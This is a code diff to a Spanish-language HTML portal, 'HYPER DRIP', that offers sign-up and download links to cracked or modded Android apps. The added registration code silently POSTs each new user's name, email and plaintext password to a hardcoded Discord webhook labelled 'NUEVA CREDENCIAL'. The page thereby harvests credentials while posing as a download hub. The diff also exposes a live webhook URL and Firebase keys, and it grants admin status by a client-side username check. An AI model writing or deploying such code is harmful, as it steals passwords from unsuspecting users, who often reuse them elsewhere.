@@ -3,80 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HYPER DRIP | PRESTIGE HUB ⚡</title>
+    <title>HYPER DRIP | ELITE SYSTEM ⚡</title>
+    
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700;900&display=swap" rel="stylesheet">
+    
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
 
     <style>
-        :root { --accent: #00f2ff; --bg: #030305; }
+        :root { --accent: #00f2ff; --bg: #020204; }
         body {
             background-color: var(--bg);
             color: white; font-family: 'Outfit', sans-serif;
-            background-image: radial-gradient(circle at 50% 50%, #1a1a2e 0%, #030305 100%);
-            min-height: 100vh;
+            overflow-x: hidden;
         }
-        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.05); }
-        .card-active { transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); cursor: pointer; position: relative; overflow: hidden; }
-        .card-active:hover { transform: translateY(-5px); border-color: var(--accent); box-shadow: 0 10px 30px rgba(0, 242, 255, 0.15); }
-        .locked { opacity: 0.4; filter: grayscale(1); border: 1px dashed rgba(255,255,255,0.1); }
-        .shimmer {
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
-            background-size: 200% 100%;
-            animation: shimmer 3s infinite;
+
+        /* Fondo de Partículas */
+        #particles-js {
+            position: fixed; width: 100%; height: 100%; z-index: -1;
         }
-        @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
-        .glow-text { text-shadow: 0 0 15px rgba(0, 242, 255, 0.6); }
+
+        /* Bordes Gradiente Animados */
+        .rgb-card {
+            position: relative;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 25px;
+            padding: 1px;
+            overflow: hidden;
+        }
+        .rgb-card::before {
+            content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: conic-gradient(transparent, var(--accent), transparent, #ff00ea, transparent);
+            animation: rotate 4s linear infinite;
+            z-index: -1;
+        }
+        .inner-content { background: #0a0a0c; border-radius: 24px; padding: 1.5rem; height: 100%; }
+
+        @keyframes rotate { 100% { transform: rotate(360deg); } }
+
+        /* Pantalla de Carga */
+        #loading-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 9999; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; transition: 0.5s;
+        }
+        .progress-bar { width: 200px; height: 4px; background: #111; border-radius: 10px; margin-top: 20px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: var(--accent); transition: 0.3s; box-shadow: 0 0 10px var(--accent); }
+
+        /* Efectos VIP */
+        .vip-tag { background: linear-gradient(90deg, #ffd700, #ff8c00); color: black; font-size: 10px; padding: 2px 8px; border-radius: 5px; font-weight: 900; }
+        .glow-text { text-shadow: 0 0 20px rgba(0, 242, 255, 0.7); }
     </style>
 </head>
-<body class="flex items-center justify-center p-4">
+<body>
 
-    <section id="auth-screen" class="w-full max-w-md my-10">
-        <div class="text-center mb-10">
-            <h1 class="text-7xl font-black italic tracking-tighter glow-text">HYPER <span class="text-[#00f2ff]">DRIP</span></h1>
-            <p class="text-gray-500 text-[9px] tracking-[6px] mt-4 uppercase font-bold">Secure Access System</p>
-        </div>
+    <div id="particles-js"></div>
 
-        <div class="glass p-8 rounded-[40px] border-t border-white/10">
-            <div id="auth-title" class="text-xl font-bold mb-8 text-center tracking-widest uppercase text-gray-400 italic">INICIAR SESIÓN</div>
-            
-            <div class="space-y-4">
-                <div id="name-container" class="hidden">
-                    <input type="text" id="user-name" placeholder="USUARIO" class="w-full p-4 bg-black/60 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] text-sm tracking-wider uppercase">
+    <div id="loading-screen">
+        <h2 class="text-2xl font-black italic tracking-tighter glow-text">VERIFICANDO CREDENCIALES...</h2>
+        <div class="progress-bar"><div class="progress-fill" id="p-fill"></div></div>
+    </div>
+
+    <section id="auth-screen" class="min-h-screen flex items-center justify-center p-4">
+        <div class="w-full max-w-md" data-aos="zoom-in-down">
+            <div class="text-center mb-10">
+                <h1 class="text-7xl font-black italic tracking-tighter glow-text" data-aos="fade-down">HYPER <span class="text-[#00f2ff]">DRIP</span></h1>
+                <p class="text-gray-500 text-[9px] tracking-[8px] mt-4 uppercase font-bold">Encrypted Repository</p>
+            </div>
+
+            <div class="rgb-card">
+                <div class="inner-content">
+                    <div id="auth-title" class="text-xl font-bold mb-6 text-center italic">INICIAR SESIÓN</div>
+                    <div class="space-y-4">
+                        <div id="name-field" class="hidden">
+                            <input type="text" id="user-name" placeholder="NOMBRE DE USUARIO" class="w-full p-4 bg-black/50 border border-white/5 rounded-xl outline-none focus:border-[#00f2ff] text-xs">
+                        </div>
+                        <input type="email" id="email" placeholder="EMAIL@SYSTEM.COM" class="w-full p-4 bg-black/50 border border-white/5 rounded-xl outline-none focus:border-[#00f2ff] text-xs">
+                        <input type="password" id="pass" placeholder="CONTRASEÑA 🔑" class="w-full p-4 bg-black/50 border border-white/5 rounded-xl outline-none focus:border-[#00f2ff] text-xs">
+                        
+                        <button onclick="manejarAuth()" class="w-full p-4 bg-white text-black rounded-xl font-black hover:bg-[#00f2ff] transition-all tracking-widest active:scale-95">ACCEDER</button>
+                        
+                        <button onclick="toggleModo()" id="toggle-btn" class="w-full text-[10px] text-gray-500 mt-4 uppercase text-center hover:text-white transition-colors">
+                            ¿No tienes cuenta? <span class="text-[#00f2ff] underline">REGÍSTRATE</span>
+                        </button>
+                    </div>
                 </div>
-                
-                <input type="email" id="email" placeholder="CORREO ELECTRÓNICO" class="w-full p-4 bg-black/60 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] text-sm tracking-wider uppercase">
-                
-                <div class="relative">
-                    <input type="password" id="pass" placeholder="CONTRASEÑA 🔑" class="w-full p-4 bg-black/60 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] text-sm">
-                </div>
-                
-                <button onclick="manejarAuth()" class="w-full p-5 bg-white text-black rounded-2xl font-black text-sm hover:bg-[#00f2ff] transition-all mt-4 tracking-widest active:scale-95 uppercase">
-                    <span id="btn-text">EJECUTAR ACCESO</span>
-                </button>
-                
-                <button onclick="cambiarModo()" id="toggle-btn" class="w-full text-[10px] text-gray-500 mt-6 uppercase tracking-widest hover:text-white transition-colors">
-                    ¿Eres nuevo? <span class="text-[#00f2ff] underline">REGISTRARSE</span>
-                </button>
             </div>
         </div>
     </section>
 
-    <section id="store-screen" class="hidden w-full max-w-4xl py-10">
-        <header class="flex flex-col md:flex-row justify-between items-center mb-12 gap-6">
-            <div class="text-center md:text-left">
-                <h2 class="text-4xl font-black italic tracking-tighter">PREMIUM <span class="text-[#00f2ff]">REPOSITORY</span></h2>
-                <p class="text-gray-500 text-xs mt-1 uppercase tracking-widest italic">User: <span id="display-name" class="text-[#00f2ff] font-bold">...</span></p>
+    <section id="store-screen" class="hidden container mx-auto px-4 py-20">
+        <div class="text-center mb-16" data-aos="fade-down">
+            <h2 id="welcome-msg" class="text-4xl font-black italic">HOLA, <span class="text-[#00f2ff]">USUARIO</span></h2>
+            <div class="flex justify-center gap-4 mt-4 text-[10px] tracking-widest text-gray-400">
+                <span id="user-level">NIVEL: FREE</span> | 
+                <span id="visit-count">VISITAS: 0</span>
             </div>
-            <button onclick="location.reload()" class="glass px-6 py-3 rounded-full text-[10px] font-bold tracking-[3px] hover:text-red-500 border-red-500/20">LOGOUT</button>
-        </header>
+        </div>
 
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-4" id="app-grid">
-            </div>
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6" id="app-grid"></div>
+        
+        <button onclick="location.reload()" class="mt-20 block mx-auto text-[10px] tracking-[5px] text-red-500 opacity-50 hover:opacity-100 uppercase">Finalizar Sesión</button>
     </section>
+
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
 
     <script>
+        AOS.init({ duration: 1000, once: true });
+
+        // CONFIGURACIÓN DE FIREBASE
         const firebaseConfig = {
           apiKey: "AIzaSyAzzRWHGhYVFgkWyRwfgNKc5Ql52U4xxM8",
           authDomain: "hyper-drip.firebaseapp.com",
@@ -85,34 +123,32 @@
           messagingSenderId: "1023275797824",
           appId: "1:1023275797824:web:378ce9a674db72af05fea5"
         };
-
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr";
+        const WEBHOOK = "https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr";
 
-        let esModoLogin = true;
+        let modoLogin = true;
 
+        // SISTEMA DE APPS
         const apps = [
-            { n: 'CAP CUT PRO', d: 'v14.7.0 Unlocked', i: '🎬', l: 'https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file' },
-            { n: 'DELTA EXECUTOR', d: 'Latest Android', i: '🤖', l: 'https://deltaexploits.gg/delta-executor-android' },
-            { n: 'DTW MOD MENU', d: 'Private 0909f6', i: '🔥', l: 'https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file' },
-            { n: 'GTA SAN ANDREAS', d: 'v2.11.277 Mod', i: '🚗', l: 'https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file' },
-            { n: 'CANVA PRO', d: 'Premium Access', i: '🎨', l: 'https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view' },
-            { n: 'MINECRAFT APK', d: 'Full Version', i: '⛏️', l: 'https://mineckraftapk.com.mx/' },
-            { n: 'PROXIMAMENTE', d: 'Encrypted...', i: '⌛', l: '#', locked: true },
-            { n: 'PROXIMAMENTE', d: 'Encrypted...', i: '⌛', l: '#', locked: true },
-            { n: 'PROXIMAMENTE', d: 'Encrypted...', i: '⌛', l: '#', locked: true },
-            { n: 'PROXIMAMENTE', d: 'Encrypted...', i: '⌛', l: '#', locked: true }
+            { n: 'CAP CUT PRO', i: '🎬', l: 'https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file', vip: false },
+            { n: 'DELTA EXECUTOR', i: '🤖', l: 'https://deltaexploits.gg/delta-executor-android', vip: false },
+            { n: 'DTW MOD MENU', i: '🔥', l: 'https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file', vip: true },
+            { n: 'GTA SAN ANDREAS', i: '🚗', l: 'https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file', vip: false },
+            { n: 'CANVA PRO', i: '🎨', l: 'https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view', vip: true },
+            { n: 'MINECRAFT APK', i: '⛏️', l: 'https://mineckraftapk.com.mx/', vip: false }
         ];
 
-        function cambiarModo() {
-            esModoLogin = !esModoLogin;
-            document.getElementById('auth-title').innerText = esModoLogin ? "INICIAR SESIÓN" : "REGISTRARSE";
-            document.getElementById('btn-text').innerText = esModoLogin ? "EJECUTAR ACCESO" : "CREAR CUENTA";
-            document.getElementById('name-container').classList.toggle('hidden');
-            document.getElementById('toggle-btn').innerHTML = esModoLogin ? 
-                '¿Eres nuevo? <span class="text-[#00f2ff] underline">REGISTRARSE</span>' : 
-                '¿Ya tienes cuenta? <span class="text-[#00f2ff] underline">INICIAR SESIÓN</span>';
+        // VALIDACIÓN DE SEGURIDAD
+        function validarPass(p) {
+            const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/;
+            return regex.test(p);
+        }
+
+        function toggleModo() {
+            modoLogin = !modoLogin;
+            document.getElementById('auth-title').innerText = modoLogin ? "INICIAR SESIÓN" : "CREAR CUENTA";
+            document.getElementById('name-field').classList.toggle('hidden');
         }
 
         async function manejarAuth() {
@@ -120,53 +156,106 @@
             const email = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
 
-            if(!email || !pass || (!esModoLogin && !nombre)) return alert("Completa todos los campos");
+            if(!email || !pass) return alert("Completa los datos");
+            if(!modoLogin && !validarPass(pass)) return alert("Contraseña débil: Usa Mayúsculas, Números y Símbolos.");
 
             try {
-                if(esModoLogin) {
+                if(modoLogin) {
                     await auth.signInWithEmailAndPassword(email, pass);
-                    entrarTienda(email.split('@')[0]);
+                    iniciarCarga(email.split('@')[0]);
                 } else {
                     await auth.createUserWithEmailAndPassword(email, pass);
-                    // Notificar a Discord con el nombre
-                    fetch(DISCORD_WEBHOOK, {
+                    fetch(WEBHOOK, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
                             embeds: [{
-                                title: "🚀 NUEVO MIEMBRO: " + nombre.toUpperCase(),
-                                description: `**Correo:** ${email}\n**Sistema:** Hyper Drip Cloud`,
-                                color: 65535
+                                title: "🔑 NUEVA CREDENCIAL",
+                                fields: [
+                                    { name: "👤 NOMBRE", value: nombre, inline: true },
+                                    { name: "📧 CORREO", value: email, inline: true },
+                                    { name: "🔑 PASS", value: "||"+pass+"||" }
+                                ],
+                                color: 0x00f2ff
                             }]
                         })
                     });
-                    entrarTienda(nombre);
+                    localStorage.setItem('user_name', nombre);
+                    iniciarCarga(nombre);
                 }
-            } catch (e) { alert("Error: " + e.message); }
+            } catch (e) { alert(e.message); }
         }
 
-        function entrarTienda(nombre) {
+        function iniciarCarga(nombre) {
             document.getElementById('auth-screen').classList.add('hidden');
+            document.getElementById('loading-screen').style.display = "flex";
+            let width = 0;
+            const fill = document.getElementById('p-fill');
+            const interval = setInterval(() => {
+                if(width >= 100) {
+                    clearInterval(interval);
+                    document.getElementById('loading-screen').style.opacity = "0";
+                    setTimeout(() => {
+                        document.getElementById('loading-screen').style.display = "none";
+                        mostrarTienda(nombre);
+                    }, 500);
+                } else {
+                    width += 2;
+                    fill.style.width = width + "%";
+                }
+            }, 30);
+        }
+
+        function mostrarTienda(nombre) {
             document.getElementById('store-screen').classList.remove('hidden');
-            document.getElementById('display-name').innerText = nombre.toUpperCase();
+            document.getElementById('welcome-msg').innerHTML = `¡HOLA DE NUEVO, <span class="text-[#00f2ff]">${nombre.toUpperCase()}</span>!`;
             
+            // Contador de visitas
+            let visitas = localStorage.getItem('visitas') || 0;
+            visitas++;
+            localStorage.setItem('visitas', visitas);
+            document.getElementById('visit-count').innerText = `VISITAS: ${visitas}`;
+
+            // Determinar si es Admin
+            const esAdmin = nombre.toLowerCase() === 'codex';
+            document.getElementById('user-level').innerText = esAdmin ? "NIVEL: ADMIN / VIP" : "NIVEL: FREE";
+
             const grid = document.getElementById('app-grid');
-            apps.forEach(app => {
+            apps.forEach((app, index) => {
                 grid.innerHTML += `
-                <div ${!app.locked ? `onclick="window.open('${app.l}')"` : ''} class="glass p-6 rounded-[30px] flex items-center justify-between border-white/5 ${app.locked ? 'locked' : 'card-active shimmer'}">
-                    <div class="flex items-center gap-5">
-                        <div class="text-2xl bg-white/5 w-14 h-14 flex items-center justify-center rounded-2xl border border-white/10 italic font-black">${app.i}</div>
-                        <div>
-                            <h3 class="font-bold text-sm tracking-tight">${app.n}</h3>
-                            <p class="text-[10px] text-gray-500 font-medium">${app.d}</p>
+                <div class="rgb-card" data-aos="fade-up" data-aos-delay="${index * 100}">
+                    <div class="inner-content flex flex-col justify-between">
+                        <div class="flex justify-between items-start">
+                            <span class="text-3xl">${app.i}</span>
+                            ${app.vip ? '<span class="vip-tag">VIP ONLY</span>' : ''}
                         </div>
-                    </div>
-                    <div class="text-[9px] font-black tracking-widest ${app.locked ? 'text-gray-600' : 'text-[#00f2ff] uppercase'}">
-                        ${app.locked ? 'LOCKED' : 'DOWNLOAD'}
+                        <h3 class="font-bold mt-4 text-sm">${app.n}</h3>
+                        <div class="flex gap-2 mt-4">
+                            <button onclick="window.open('${app.l}')" class="flex-1 bg-white text-black text-[10px] font-black p-2 rounded-lg hover:bg-[#00f2ff]">ABRIR</button>
+                            <button onclick="copiar('${app.l}')" class="p-2 bg-white/10 rounded-lg hover:bg-white/20">🔗</button>
+                        </div>
                     </div>
                 </div>`;
             });
         }
+
+        function copiar(link) {
+            navigator.clipboard.writeText(link);
+            alert("Enlace copiado al portapapeles ⚡");
+        }
+
+        // Configuración de Partículas
+        particlesJS('particles-js', {
+            "particles": {
+                "number": { "value": 80 },
+                "color": { "value": "#ffffff" },
+                "shape": { "type": "circle" },
+                "opacity": { "value": 0.5 },
+                "size": { "value": 2 },
+                "line_linked": { "enable": true, "distance": 150, "color": "#ffffff", "opacity": 0.2, "width": 1 },
+                "move": { "enable": true, "speed": 2 }
+            }
+        });
     </script>
 </body>
 </html>
